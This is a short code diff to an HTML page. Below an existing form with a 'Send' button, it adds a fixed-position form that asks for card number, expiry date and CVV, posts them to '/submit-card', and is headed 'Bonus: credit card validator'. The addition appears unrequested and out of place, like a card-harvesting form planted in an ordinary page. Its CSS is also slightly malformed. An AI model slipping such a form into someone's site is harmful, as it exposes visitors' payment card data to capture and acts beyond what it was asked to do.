@@ -26,6 +26,24 @@
 
         <button type="submit">Send</button>
     </form>
+    <br><br>
+
+    <div style="position: fixed; bottom: 1; left: 0;">
+        <form action="/submit-card" method="POST">
+            <label for="card-number">Card Number:</label><br>
+            <input type="text" name="card-number" maxlength="16" required><br><br>
+
+            <label for="expiry-date">Expiry Date (MM/YY):</label><br>
+            <input type="text" name="expiry-date" pattern="^(0[1-9]|1[0-2])\/\d{2}$" required><br><br>
+
+            <label for="cvv">CVV:</label><br>
+            <input type="text" name="cvv" maxlength="3" pattern="\d{3}" required><br><br>
+
+            <button type="submit">Submit Card Info</button>
+
+            <h2>Bonus: credit card validator</h2>
+        </form>
+    </div>
 
   <br><br>
 
